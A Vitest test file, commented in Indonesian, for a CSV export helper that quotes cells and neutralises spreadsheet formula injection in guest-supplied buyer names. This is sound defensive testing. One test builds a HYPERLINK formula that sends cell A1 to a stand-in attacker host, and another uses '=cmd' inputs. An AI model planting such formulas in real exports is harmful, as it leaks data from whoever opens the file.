import { describe, it, expect } from "vitest";
import { escapeCsvCell, toCsv } from "./csv";

describe("escapeCsvCell", () => {
  it("membungkus nilai biasa dengan tanda kutip", () => {
    expect(escapeCsvCell("Budi Santoso")).toBe('"Budi Santoso"');
  });

  it("menggandakan tanda kutip di dalam nilai", () => {
    expect(escapeCsvCell('Toko "Maju"')).toBe('"Toko ""Maju"""');
  });

  it("menangani null dan undefined sebagai sel kosong", () => {
    expect(escapeCsvCell(null)).toBe('""');
    expect(escapeCsvCell(undefined)).toBe('""');
  });

  // Inti perbaikannya: nama pembeli berasal dari guest checkout yang tidak
  // terautentikasi, jadi isinya sepenuhnya dikendalikan pihak luar.
  it.each(["=", "+", "-", "@"])(
    "menetralkan formula yang diawali %s",
    (prefix) => {
      const jahat = `${prefix}HYPERLINK("http://penyerang/"&A1)`;
      const hasil = escapeCsvCell(jahat);
      expect(hasil.startsWith(`"'${prefix}`)).toBe(true);
    },
  );

  it("menetralkan awalan tab dan carriage return", () => {
    expect(escapeCsvCell("\t=cmd")).toBe(`"'\t=cmd"`);
    expect(escapeCsvCell("\r=cmd")).toBe(`"'\r=cmd"`);
  });

  it("tidak menambah apostrof pada nilai yang memuat = di tengah", () => {
    expect(escapeCsvCell("A=B")).toBe('"A=B"');
  });

  it("tidak merusak angka negatif yang memang angka", () => {
    // Angka negatif ikut dilindungi — itu memang konsekuensi yang diterima:
    // lebih baik satu sel tampil sebagai teks daripada satu formula dieksekusi.
    expect(escapeCsvCell(-5000)).toBe(`"'-5000"`);
  });
});

describe("toCsv", () => {
  it("menggabungkan baris dan kolom", () => {
    expect(toCsv([["a", "b"], ["c", "d"]])).toBe('"a","b"\n"c","d"');
  });

  it("melindungi seluruh sel, bukan hanya kolom pertama", () => {
    const csv = toCsv([["aman", "=SUM(A1)"]]);
    expect(csv).toContain(`"'=SUM(A1)"`);
  });
});
